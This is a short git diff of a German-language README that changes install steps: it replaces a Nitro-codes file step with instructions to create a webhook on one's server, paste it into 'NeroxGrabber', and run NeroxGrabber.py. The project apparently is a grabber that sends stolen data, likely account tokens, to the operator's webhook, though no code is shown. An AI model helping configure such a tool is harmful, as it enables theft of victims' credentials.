@@ -28,13 +28,14 @@
 ```
 pip install -r requirements.txt
 ```
-* Datenbank erstellen
+* Webhook:
 ```
-erstelle Nitro Codes.txt
+erstelle ein Webhook auf deinem Server
+füge deine Webhook in NeroxGrabber Zeile(
 ```
 * Run datei:
 ```
-starte main.py
+starte NeroxGrabber.py
 ```
 
 <h1 align='center'>🔮 UPDATES / LOGS 🔮</h1>
